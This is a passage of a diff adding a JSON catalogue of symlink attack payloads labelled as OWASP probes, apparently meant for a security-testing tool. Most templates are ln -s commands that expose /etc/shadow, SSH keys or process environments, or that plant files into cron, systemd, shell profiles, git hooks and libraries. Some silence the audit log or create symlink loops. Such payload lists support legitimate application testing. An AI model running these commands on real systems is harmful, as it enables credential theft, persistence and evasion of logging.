+    "description": "Relative path symlinks probe from OWASP. Tests application handling of: ln -s ../../../etc/passwd pass...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0084",
+    "name": "Symlink crontab",
+    "template": "ln -s /tmp/evil_cron /var/spool/cron/crontabs/root",
+    "description": "Symlink crontab probe from OWASP. Tests application handling of: ln -s /tmp/evil_cron /var/spoo...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0085",
+    "name": "Symlink crontab #2",
+    "template": "ln -s /tmp/attacker_cron /etc/cron.d/custom",
+    "description": "Symlink crontab probe from OWASP. Tests application handling of: ln -s /tmp/attacker_cron /etc/...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0086",
+    "name": "Symlink cron scripts",
+    "template": "ln -s /tmp/evil_script.sh /etc/cron.daily/backup",
+    "description": "Symlink cron scripts probe from OWASP. Tests application handling of: ln -s /tmp/evil_script.sh /etc...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0087",
+    "name": "MySQL data directory symlinks",
+    "template": "ln -s /etc/passwd /var/lib/mysql/database/table.MYD",
+    "description": "MySQL data directory symlinks probe from OWASP. Tests application handling of: ln -s /etc/passwd /var/lib/mys...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0088",
+    "name": "PostgreSQL symlinks",
+    "template": "ln -s /etc/shadow /var/lib/postgresql/data/pg_hba.conf",
+    "description": "PostgreSQL symlinks probe from OWASP. Tests application handling of: ln -s /etc/shadow /var/lib/pos...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0089",
+    "name": "SQLite database symlinks",
+    "template": "ln -s /etc/passwd /var/www/app/database.sqlite",
+    "description": "SQLite database symlinks probe from OWASP. Tests application handling of: ln -s /etc/passwd /var/www/app...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0090",
+    "name": "PHP session symlinks",
+    "template": "ln -s /etc/passwd /var/lib/php/sessions/sess_abc123",
+    "description": "PHP session symlinks probe from OWASP. Tests application handling of: ln -s /etc/passwd /var/lib/php...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0091",
+    "name": "PHP session symlinks #2",
+    "template": "ln -s /tmp/attacker_session /var/lib/php/sessions/sess_victim",
+    "description": "PHP session symlinks probe from OWASP. Tests application handling of: ln -s /tmp/attacker_session /v...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0092",
+    "name": "Application session symlinks",
+    "template": "ln -s /etc/shadow /tmp/sessions/user_session_123",
+    "description": "Application session symlinks probe from OWASP. Tests application handling of: ln -s /etc/shadow /tmp/session...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0093",
+    "name": "NPM/Node modules",
+    "template": "ln -s /tmp/evil_module /var/www/app/node_modules/package",
+    "description": "NPM/Node modules probe from OWASP. Tests application handling of: ln -s /tmp/evil_module /var/ww...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0094",
+    "name": "Python site-packages",
+    "template": "ln -s /tmp/evil_module.py /usr/lib/python3/site-packages/module.py",
+    "description": "Python site-packages probe from OWASP. Tests application handling of: ln -s /tmp/evil_module.py /usr...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0095",
+    "name": "Systemd service symlinks",
+    "template": "ln -s /tmp/evil.service /etc/systemd/system/app.service",
+    "description": "Systemd service symlinks probe from OWASP. Tests application handling of: ln -s /tmp/evil.service /etc/s...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0096",
+    "name": "Init script symlinks",
+    "template": "ln -s /tmp/evil_script /etc/init.d/custom_service",
+    "description": "Init script symlinks probe from OWASP. Tests application handling of: ln -s /tmp/evil_script /etc/in...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0097",
+    "name": "Mail spool symlinks",
+    "template": "ln -s /etc/shadow /var/mail/root",
+    "description": "Mail spool symlinks probe from OWASP. Tests application handling of: ln -s /etc/shadow /var/mail/ro...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0098",
+    "name": "Mail spool symlinks #2",
+    "template": "ln -s /root/.ssh/id_rsa /var/spool/mail/user",
+    "description": "Mail spool symlinks probe from OWASP. Tests application handling of: ln -s /root/.ssh/id_rsa /var/s...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0099",
+    "name": "Symlink to devices",
+    "template": "ln -s /dev/random /tmp/data_file",
+    "description": "Symlink to devices probe from OWASP. Tests application handling of: ln -s /dev/random /tmp/data_fi...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0100",
+    "name": "Symlink to devices #2",
+    "template": "ln -s /dev/null /tmp/output.txt",
+    "description": "Symlink to devices probe from OWASP. Tests application handling of: ln -s /dev/null /tmp/output.tx...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0101",
+    "name": "Printer spool",
+    "template": "ln -s /etc/passwd /var/spool/cups/tmp/job_123",
+    "description": "Printer spool probe from OWASP. Tests application handling of: ln -s /etc/passwd /var/spool/c...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0102",
+    "name": "Docker volume symlinks",
+    "template": "ln -s /etc/passwd /var/lib/docker/volumes/app/_data/config.txt",
+    "description": "Docker volume symlinks probe from OWASP. Tests application handling of: ln -s /etc/passwd /var/lib/doc...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0103",
+    "name": "Container mount symlinks",
+    "template": "ln -s /host/etc/passwd /container/app/data/passwd.txt",
+    "description": "Container mount symlinks probe from OWASP. Tests application handling of: ln -s /host/etc/passwd /contai...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0104",
+    "name": "Git hooks symlinks",
+    "template": "ln -s /tmp/evil_hook.sh /var/www/app/.git/hooks/pre-commit",
+    "description": "Git hooks symlinks probe from OWASP. Tests application handling of: ln -s /tmp/evil_hook.sh /var/w...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0105",
+    "name": "Git config symlinks",
+    "template": "ln -s /tmp/evil_config /var/www/app/.git/config",
+    "description": "Git config symlinks probe from OWASP. Tests application handling of: ln -s /tmp/evil_config /var/ww...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0106",
+    "name": "Include file symlinks",
+    "template": "ln -s /etc/passwd /usr/include/config.h",
+    "description": "Include file symlinks probe from OWASP. Tests application handling of: ln -s /etc/passwd /usr/include...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0107",
+    "name": "Library symlinks",
+    "template": "ln -s /tmp/evil.so /usr/lib/libapp.so",
+    "description": "Library symlinks probe from OWASP. Tests application handling of: ln -s /tmp/evil.so /usr/lib/li...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0108",
+    "name": "Browser profile symlinks",
+    "template": "ln -s /etc/passwd ~/.mozilla/firefox/profile/prefs.js",
+    "description": "Browser profile symlinks probe from OWASP. Tests application handling of: ln -s /etc/passwd ~/.mozilla/f...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0109",
+    "name": "Browser profile symlinks #2",
+    "template": "ln -s /etc/shadow ~/.config/google-chrome/Default/Preferences",
+    "description": "Browser profile symlinks probe from OWASP. Tests application handling of: ln -s /etc/shadow ~/.config/go...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0110",
+    "name": "Symlinks to setuid binaries (for analysis)",
+    "template": "ln -s /usr/bin/sudo /tmp/sudo_link",
+    "description": "Symlinks to setuid binaries (for analysis) probe from OWASP. Tests application handling of: ln -s /usr/bin/sudo /tmp/sudo_...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0111",
+    "name": "Symlinks to setuid binaries (for analysis) #2",
+    "template": "ln -s /usr/bin/passwd /tmp/passwd_link",
+    "description": "Symlinks to setuid binaries (for analysis) probe from OWASP. Tests application handling of: ln -s /usr/bin/passwd /tmp/pas...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0112",
+    "name": "Process information symlinks",
+    "template": "ln -s /proc/self/environ /var/www/html/env.txt",
+    "description": "Process information symlinks probe from OWASP. Tests application handling of: ln -s /proc/self/environ /var/...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0113",
+    "name": "Process information symlinks #2",
+    "template": "ln -s /proc/self/cmdline /tmp/cmdline.txt",
+    "description": "Process information symlinks probe from OWASP. Tests application handling of: ln -s /proc/self/cmdline /tmp/...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0114",
+    "name": "Process information symlinks #3",
+    "template": "ln -s /proc/self/cwd /tmp/cwd_link",
+    "description": "Process information symlinks probe from OWASP. Tests application handling of: ln -s /proc/self/cwd /tmp/cwd_...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0115",
+    "name": "Process information symlinks #4",
+    "template": "ln -s /proc/self/fd/0 /tmp/stdin_link",
+    "description": "Process information symlinks probe from OWASP. Tests application handling of: ln -s /proc/self/fd/0 /tmp/std...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0116",
+    "name": "Network config symlinks",
+    "template": "ln -s /tmp/evil_hosts /etc/hosts",
+    "description": "Network config symlinks probe from OWASP. Tests application handling of: ln -s /tmp/evil_hosts /etc/hos...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0117",
+    "name": "Network config symlinks #2",
+    "template": "ln -s /tmp/evil_resolv /etc/resolv.conf",
+    "description": "Network config symlinks probe from OWASP. Tests application handling of: ln -s /tmp/evil_resolv /etc/re...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0118",
+    "name": "Network config symlinks #3",
+    "template": "ln -s /tmp/evil_network /etc/network/interfaces",
+    "description": "Network config symlinks probe from OWASP. Tests application handling of: ln -s /tmp/evil_network /etc/n...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0119",
+    "name": "Shell profile symlinks",
+    "template": "ln -s /tmp/evil_bashrc /home/user/.bashrc",
+    "description": "Shell profile symlinks probe from OWASP. Tests application handling of: ln -s /tmp/evil_bashrc /home/u...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0120",
+    "name": "Shell profile symlinks #2",
+    "template": "ln -s /tmp/evil_profile /home/user/.profile",
+    "description": "Shell profile symlinks probe from OWASP. Tests application handling of: ln -s /tmp/evil_profile /home/...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0121",
+    "name": "Shell profile symlinks #3",
+    "template": "ln -s /tmp/evil_zshrc /home/user/.zshrc",
+    "description": "Shell profile symlinks probe from OWASP. Tests application handling of: ln -s /tmp/evil_zshrc /home/us...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0122",
+    "name": "Audit log symlinks",
+    "template": "ln -s /dev/null /var/log/audit/audit.log",
+    "description": "Audit log symlinks probe from OWASP. Tests application handling of: ln -s /dev/null /var/log/audit...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0123",
+    "name": "Monitoring config symlinks",
+    "template": "ln -s /tmp/evil_config /etc/nagios/nrpe.cfg",
+    "description": "Monitoring config symlinks probe from OWASP. Tests application handling of: ln -s /tmp/evil_config /etc/na...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0124",
+    "name": "AWS metadata symlinks (if accessible)",
+    "template": "ln -s /proc/self/environ /var/www/html/aws_metadata.txt",
+    "description": "AWS metadata symlinks (if accessible) probe from OWASP. Tests application handling of: ln -s /proc/self/environ /var/...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0125",
+    "name": "Create circular symlinks for DoS",
+    "template": "ln -s /tmp/link1 /tmp/link2",
+    "description": "Create circular symlinks for DoS probe from OWASP. Tests application handling of: ln -s /tmp/link1 /tmp/link2",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0126",
+    "name": "Create circular symlinks for DoS #2",
+    "template": "ln -s /tmp/link2 /tmp/link1",
+    "description": "Create circular symlinks for DoS probe from OWASP. Tests application handling of: ln -s /tmp/link2 /tmp/link1",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0127",
+    "name": "Self-referential symlink",
+    "template": "ln -s /tmp/selflink /tmp/selflink",
+    "description": "Self-referential symlink probe from OWASP. Tests application handling of: ln -s /tmp/selflink /tmp/selfl...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0128",
+    "name": "Check if file is a symlink",
+    "template": "test -L /path/to/file && echo \"Is a symlink\"",
+    "description": "Check if file is a symlink probe from OWASP. Tests application handling of: test -L /path/to/file && echo ...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0129",
+    "name": "List symlinks",
+    "template": "find /path -type l",
+    "description": "List symlinks probe from OWASP. Tests application handling of: find /path -type l",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0130",
+    "name": "Show symlink target",
+    "template": "readlink /path/to/symlink",
+    "description": "Show symlink target probe from OWASP. Tests application handling of: readlink /path/to/symlink",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0131",
+    "name": "Show symlink target #2",
+    "template": "ls -l /path/to/symlink",
+    "description": "Show symlink target probe from OWASP. Tests application handling of: ls -l /path/to/symlink",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0132",
+    "name": "Create symlink with specific name",
+    "template": "ln -s /target /symlink_name",
+    "description": "Create symlink with specific name probe from OWASP. Tests application handling of: ln -s /target /symlink_name",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0133",
+    "name": "Force create symlink (overwrite existing)",
+    "template": "ln -sf /target /symlink_name",
+    "description": "Force create symlink (overwrite existing) probe from OWASP. Tests application handling of: ln -sf /target /symlink_name",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0134",
+    "name": "Create relative symlink",
+    "template": "ln -sr /target /symlink_name",
+    "description": "Create relative symlink probe from OWASP. Tests application handling of: ln -sr /target /symlink_name",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0135",
+    "name": "Test if application follows symlinks",
+    "template": "ln -s /etc/passwd /tmp/test_symlink.txt",
+    "description": "Test if application follows symlinks probe from OWASP. Tests application handling of: ln -s /etc/passwd /tmp/test_sy...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0136",
+    "name": "Test path validation",
+    "template": "ln -s /etc/passwd allowed_dir/../../etc/passwd_link",
+    "description": "Test path validation probe from OWASP. Tests application handling of: ln -s /etc/passwd allowed_dir/...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  }
+]
